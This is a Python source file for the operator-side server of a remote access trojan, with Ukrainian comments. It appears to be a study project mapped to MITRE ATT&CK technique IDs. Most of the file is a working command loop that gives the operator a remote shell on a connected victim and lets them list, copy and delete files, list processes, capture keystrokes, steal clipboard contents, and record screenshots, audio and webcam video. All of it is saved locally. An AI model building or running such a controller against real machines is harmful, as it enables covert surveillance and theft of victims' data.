#!/usr/bin/python
from datetime import datetime
from time import sleep
import subprocess
import sys
import cv2
import os
import socket

hostname=socket.gethostname()
IPAddr=socket.gethostbyname(hostname)
print("My Computer Name is: "+hostname)
print("My Computer IP Address is: "+IPAddr)

IP='192.168.3.5'
PORT=12345

isExist = os.path.exists("info")
if not isExist:
    os.mkdir("info")

def input_capture():
    print("Logging...")
    answer = user.recv(1024).decode()
    print(answer)

    time = datetime.now()
    filename = 'info/log_' + time.strftime('%Y-%m-%d-(%H-%M-%S)') + '.txt'
    file = open(filename, 'wb')
    while True:
        info = user.recv(4096)
        if b'done' in info or not info:
            sleep(1)
            break
        else:
            file.write(info)
    file.close()
    print('Saved as:', filename)

def file_dir():
    path = input('Enter location:')
    user.send(path.encode())
    dir = user.recv(4096).decode()
    print(dir)

def CLI():
    print("Console is opened. If you want to quit, enter 'q'")
    while True:
        command = input('>')
        user.send(command.encode())
        if command=='q':
            break
        answear = user.recv(1024).decode()
        print(answear)

def proc():
    time = datetime.now()
    filename = 'info/processes_' + time.strftime('%Y-%m-%d-(%H-%M-%S)') + '.txt'
    proc = open(filename, 'wb')
    while True:
        file = user.recv(1024)
        if b'done' in file or not file:
            break
        else:
            proc.write(file)
    print('Saved as:', filename)
    proc.close()

def sys_info():
    print("Getting system information...")
    filename = 'info/system-info.txt'
    file = open(filename, 'wb')

    while True:
        info = user.recv(1024)
        if b'done' in info or not info:
            break
        else:
            file.write(info)
    print('Saved as:',filename)
    with open(filename,'r', encoding="utf-8") as text:
        print(text.read())
    file.close()


def copy_file():
    print("Choose option:\n(1) - copy from client to server\n(2) - copy from server to client")
    choice = input(">>> ")
    print(choice)
    while choice !='1' and choice !='2':
        choice = input(">>> ")
    user.send(choice.encode())

    out_file = input('Enter output file: ')
    in_file = input('Enter input file: ')
    user.send(out_file.encode())
    user.send(in_file.encode())

    # copy from client to server
    if choice == '1':
        ans=user.recv(4096)
        if ans==b'error':
            print("No file")
        else:
            file = open(in_file, 'wb') 
            while True:
                info = user.recv(4096)
                if b'done' in info or not info:
                    sleep(1)
                    break
                else:
                    file.write(info)
            print('Saved as:',in_file)
            file.close()

    # copy from server to client
    elif choice == '2':
        if os.path.isfile(out_file):
            data = open(out_file, 'rb')
            for i in data:
                user.sendall(i)
            user.send(b'done')
            data.close()
            print('Saved as:',in_file)
        else:
            print("No file")



def del_file():
    filename = input('Enter file name: ')
    user.send(filename.encode()) 
    print(user.recv(4096).decode())

def clipboard_data():
    buffer = user.recv(8192).decode()
    print('Buffer:\n',buffer)

def screen_capture():
    time = datetime.now()
    filename = 'info/screen_' + time.strftime('%Y-%m-%d-(%H-%M-%S)') + ".jpg"
    file = open(filename,'wb')
    while True:
        image = user.recv(1024)
        if b'done' in image or not image:
            break
        else:
            file.write(image)
    print("Saved as", filename)

def audio_capture():
    while True:
        duration = input('Enter duration in seconds: ')
        if duration.isnumeric():
            break
        else:
            print("Write just a number!")
    user.send(duration.encode())
    time = datetime.now()
    filename = 'info/audio_' + time.strftime('%Y-%m-%d-(%H-%M-%S)') + ".wav"
    print('Recording audio...')
    file = open(filename, 'wb')
    while True:
        audio = user.recv(4096)
        if not audio or b'done' in audio:
            break
        else:
            file.write(audio)
    print("Saved as", filename)

def video_capture():
    while True:
        duration = input('Enter duration in seconds: ')
        if duration.isnumeric():
            break
        else:
            print("Write just a number!")
    user.send(duration.encode())
    print('Recording video...')
    time = datetime.now()
    filename = "info/video_" + time.strftime('%Y-%m-%d-(%H-%M-%S)') + ".mp4"
    file = open(filename, "wb")
    while True:
        video = user.recv(11264)
        if not video or b'done' in video:
            sleep(1)
            break
        else:
            file.write(video)
    print('Saved as', filename)


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # описує як сервер повинен приймати інформацію


server.bind((IP, PORT))  # встановимо IP-адресу і порт, яким можна буде підключитися до сервера
server.listen(5) # запустим сервер
user, address = server.accept() # реєструємо підключених клієнтів
print('INFO: Connected by', address)
user.send("connected".encode("utf-8"))

while True:
    print("\tCOMMANDS ")
    print(" sys info –  System Information Discovery (T1082)")
    print(" cli      –  Command-Line Interface (T1059)")
    print(" dir      –  File and Directory Discovery (T1083)")
    print(" copy     –  Remote File Copy (T1105)") 
    print(" del      –  File Deletion (T1107)")
    print(" ps       –  Process Discovery (T1057)")
    print(" log      –  Input Capture (T1056)")
    print(" buffer   –  Clipboard Data (T1115)")
    print(" screen   –  Screen Capture(T1113)")
    print(" audio    –  Audio Capture (T1123)")
    print(" webcam   –  Video Capture (T1125)")
    print(" exit     –  Close the program")

    command = str(input("\nEnter command: "))
    user.send(bytes(command, 'utf-8'))
    if command == "sys info": 
         print("System Information Discovery")
         sys_info()
    elif command == "cli":
         print("Command-Line Interface")
         CLI()
    elif command == "dir":
         print("File and Directory Discovery")
         file_dir()
    elif command == "copy":
         print("Remote File Copy")
         copy_file()
    elif command == "del":
        print("File Deletion")
        del_file()
    elif command == "ps":
        print("Process Discovery")
        proc()
    elif command == "log":
        print("Input Capture")
        input_capture()
    elif command == "buffer":
        print("Clipboard Data")
        clipboard_data()
    elif command == "screen":
        print("Screen Capture")
        screen_capture()
    elif command == "audio":
        print("Audio Capture")
        audio_capture()
    elif command == "webcam":
        print("Video Capture")
        video_capture()
    elif command == "exit":
        user.send('exit'.encode())
        break
    else:
        print("Try again!")
    print()
server.close() 